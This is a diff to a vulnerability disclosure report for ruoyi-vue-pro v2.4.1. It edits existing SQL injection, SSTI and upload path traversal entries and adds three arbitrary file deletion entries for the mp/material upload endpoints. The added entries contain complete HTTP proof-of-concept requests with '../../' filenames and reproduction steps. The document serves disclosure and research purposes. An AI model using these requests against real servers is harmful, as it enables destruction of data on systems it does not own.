@@ -30,7 +30,7 @@ https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk8/11).
 
 [Description]
 
-There is an SQL injection vulnerability in the SQL parameters of the `/report/go view/data/get-by-sql ` interface in the ruoyi vue pro system v2.4.1. Hackers can exploit this vulnerability to obtain sensitive server information
+There is an SQL injection vulnerability in the SQL parameters of the `/report/go-view/data/get-by-sql ` interface in the ruoyi-vue-pro system v2.4.1. Hackers can exploit this vulnerability to obtain sensitive server information
 
 POC
 
@@ -104,7 +104,7 @@ https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk8/11).
 
 [Description]
 
-The `/admin-api/bpm/model/deploy ` interface in ruoyi vue pro system v2.4.1 has an SSTI vulnerability. Hackers can exploit this vulnerability to remotely execute commands and gain server privileges
+The `/admin-api/bpm/model/deploy ` interface in ruoyi-vue-pro system v2.4.1 has an SSTI vulnerability. Hackers can exploit this vulnerability to remotely execute commands and gain server privileges
 
 POC
 
@@ -214,7 +214,7 @@ https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk17/21)
 
 [Description]
 
-There is a directory traversal vulnerability in the front-end store interface of Ruoyi Vue Pro v2.4.1, specifically in the `/app-api/infra/file/upload`. Hackers can exploit this vulnerability to upload any file to any directory on the server. If it is a Linux server, the SSH private key may be replaced, resulting in the loss of server privileges.
+There is a directory traversal vulnerability in the front-end store interface of Ruoyi-Vue-Pro v2.4.1, specifically in the `/app-api/infra/file/upload`. Hackers can exploit this vulnerability to upload any file to any directory on the server. If it is a Linux server, the SSH private key may be replaced, resulting in the loss of server privileges.
 
 POC
 
@@ -303,7 +303,7 @@ You can see the results here. If there is a situation where JSP parsing occurs o
 
 ![image-20250309142524116](assets/image-20250309142524116.png)
 
-## 4、File Path Traversal Backend
+## 4、File Path Traversal Back-end
 
 ###  `/admin-api/infra/file/upload` File Path Traversal
 
@@ -327,7 +327,7 @@ https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk17/21)
 
 [Description]
 
-There is a directory traversal vulnerability in the backend file upload interface of Ruoyi Vue Pro v2.4.1, specifically in the `/admin-api/infra/file/upload` section. Hackers can exploit this vulnerability to upload any file to any directory on the server. If it is a Linux server, the SSH private key may be replaced, resulting in the loss of server privileges.
+There is a directory traversal vulnerability in the backend file upload interface of ruoyi-vue-pro v2.4.1, specifically in the `/admin-api/infra/file/upload` section. Hackers can exploit this vulnerability to upload any file to any directory on the server. If it is a Linux server, the SSH private key may be replaced, resulting in the loss of server privileges.
 
 POC
 
@@ -406,3 +406,274 @@ Successfully added a file with the content 'flag {ssh key}' to the root director
 ![image-20250309145107163](assets/image-20250309145107163.png)
 
 ![image-20250309145129470](assets/image-20250309145129470.png)
+
+## 5、Arbitrary file deletion vulnerability --uploadPermanentMaterial
+
+###  `/admin-api/mp/material/upload-permanent` Arbitrary file deletion
+
+[Affected version]
+
+v2.4.1
+
+
+
+[Affected Component]
+
+/admin-api/mp/material/upload-permanent
+
+
+
+[Software]
+
+https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk17/21).zip
+
+
+
+[Description]
+
+There is an arbitrary file deletion vulnerability caused by directory traversal in the material upload interface of ruoyi-vue-pro v2.4.1, as described in the `/admin-api/mp/material/upload-permanent` section. Hackers can exploit this vulnerability to delete files that can be accessed by the programme.
+
+POC
+
+```
+POST /admin-api/mp/material/upload-permanent HTTP/1.1
+Host: localhost:48080
+Content-Length: 590
+sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqftzAbuQicoafHGL
+sec-ch-ua-mobile: ?0
+Authorization: Bearer ca9592f592794ffdb722eb439f2156b8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+sec-ch-ua-platform: "Windows"
+Accept: */*
+Origin: http://localhost
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundaryqftzAbuQicoafHGL
+Content-Disposition: form-data; name="type"
+
+image
+------WebKitFormBoundaryqftzAbuQicoafHGL
+Content-Disposition: form-data; name="title"
+
+
+------WebKitFormBoundaryqftzAbuQicoafHGL
+Content-Disposition: form-data; name="introduction"
+
+
+------WebKitFormBoundaryqftzAbuQicoafHGL
+Content-Disposition: form-data; name="accountId"
+
+6
+------WebKitFormBoundaryqftzAbuQicoafHGL
+Content-Disposition: form-data; name="file"; filename="../../flag.txt"
+Content-Type: image/jpeg
+
+test
+------WebKitFormBoundaryqftzAbuQicoafHGL--
+
+```
+
+This needs to be a file that the program has permission to access. We can create a test file in the AppSata directory
+
+![image-20250313084612184](assets/image-20250313084612184.png)
+
+Go to official account management ->account management ->add a test account, where the appId format should be correct, such as: wx1111111111111111
+
+![image-20250313085222777](assets/image-20250313085222777.png)
+
+Go to official account management ->material management and upload files
+
+![image-20250313085302681](assets/image-20250313085302681.png)
+
+Here filename can traverse directories
+
+![image-20250313085329511](assets/image-20250313085329511.png)
+
+Finally, this temporary file will be deleted. We can delete other files by directory traversal
+
+![image-20250313085416806](assets/image-20250313085416806.png)
+
+![image-20250313085436498](assets/image-20250313085436498.png)
+
+## 6、Arbitrary file deletion vulnerability --uploadTemporaryMaterial
+
+###  `/admin-api/mp/material/upload-temporary` Arbitrary file deletion
+
+[Affected version]
+
+v2.4.1
+
+
+
+[Affected Component]
+
+/admin-api/mp/material/upload-temporary
+
+
+
+[Software]
+
+https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk17/21).zip
+
+
+
+[Description]
+
+There is an arbitrary file deletion vulnerability caused by directory traversal in the material upload interface of ruoyi-vue-pro v2.4.1, as described in the `/admin-api/mp/material/upload-temporary` section. Hackers can exploit this vulnerability to delete files that can be accessed by the programme.
+
+POC
+
+```
+POST /admin-api/mp/material/upload-temporary HTTP/1.1
+Host: localhost:48080
+Content-Length: 4083
+sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAqb1bgnFWCYHVAUE
+sec-ch-ua-mobile: ?0
+Authorization: Bearer cd37d92191e34709a7bf43646831ca22
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+sec-ch-ua-platform: "Windows"
+Accept: */*
+Origin: http://localhost
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundaryAqb1bgnFWCYHVAUE
+Content-Disposition: form-data; name="accountId"
+
+6
+------WebKitFormBoundaryAqb1bgnFWCYHVAUE
+Content-Disposition: form-data; name="type"
+
+image
+------WebKitFormBoundaryAqb1bgnFWCYHVAUE
+Content-Disposition: form-data; name="title"
+
+
+------WebKitFormBoundaryAqb1bgnFWCYHVAUE
+Content-Disposition: form-data; name="introduction"
+
+
+------WebKitFormBoundaryAqb1bgnFWCYHVAUE
+Content-Disposition: form-data; name="file"; filename="../../test.txt"
+Content-Type: image/jpeg
+
+test
+------WebKitFormBoundaryAqb1bgnFWCYHVAUE--
+
+```
+
+This is a temporary material upload interface. We will first create a test file under appdata, and the Java program has permission to access it
+
+![image-20250313090606103](assets/image-20250313090606103.png)
+
+Go to official account management and add an account. The appid must conform to the format, such as wx1111111111111111
+
+![image-20250313090712739](assets/image-20250313090712739.png)
+
+Go to official account management ->auto reply ->add ->picture ->upload picture![image-20250313090741400](assets/image-20250313090741400.png)
+
+Here filename can traverse directories
+
+![image-20250313090840387](assets/image-20250313090840387.png)
+
+You can see the deleted path at the end of this temporary uploaded file
+
+![image-20250313090858424](assets/image-20250313090858424.png)
+
+Successfully deleted file
+
+![image-20250313090916400](assets/image-20250313090916400.png)
+
+## 7、Arbitrary file deletion vulnerability --uploadNewsImage
+
+###  `/admin-api/mp/material/upload-news-image` Arbitrary file deletion
+
+[Affected version]
+
+v2.4.1
+
+
+
+[Affected Component]
+
+/admin-api/mp/material/upload-news-image
+
+
+
+[Software]
+
+https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk17/21).zip
+
+
+
+[Description]
+
+There is an arbitrary file deletion vulnerability caused by directory traversal in the material upload interface of ruoyi-vue-pro v2.4.1, as described in the `/admin-api/mp/material/upload-news-image` section. Hackers can exploit this vulnerability to delete files that can be accessed by the programme.
+
+POC
+
+```
+POST /admin-api/mp/material/upload-news-image HTTP/1.1
+Host: localhost:48080
+Content-Length: 389
+sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi1bQzkVotz8Q6DJH
+sec-ch-ua-mobile: ?0
+Authorization: Bearer e27987519afe4a05806c081f55b74831
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+sec-ch-ua-platform: "Windows"
+Accept: */*
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Connection: close
+
+------WebKitFormBoundaryi1bQzkVotz8Q6DJH
+Content-Disposition: form-data; name="type"
+
+image
+------WebKitFormBoundaryi1bQzkVotz8Q6DJH
+Content-Disposition: form-data; name="accountId"
+
+6
+------WebKitFormBoundaryi1bQzkVotz8Q6DJH
+Content-Disposition: form-data; name="file"; filename="../../flag333.txt"
+Content-Type: image/jpeg
+
+test3
+------WebKitFormBoundaryi1bQzkVotz8Q6DJH--
+
+```
+
+Here we first create a test file called flag333.txt
+
+![image-20250313124630912](assets/image-20250313124630912.png)
+
+First, go to official account Management ->Account Management to add an account. The appId format should be correct, such as: wx1111111111111111
+
+![image-20250313124650873](assets/image-20250313124650873.png)
+
+Then directly construct the data packet of the POC above, filename=../../flag333.txt， Send packets
+
+![image-20250313124703157](assets/image-20250313124703157.png)
+
+You can see that the uploadNewsImage interface here also uses the last del method and does not filter, Causing directory traversal
+
+![image-20250313124734220](assets/image-20250313124734220.png)
+
+File successfully deleted
+
+![image-20250313124801796](assets/image-20250313124801796.png)
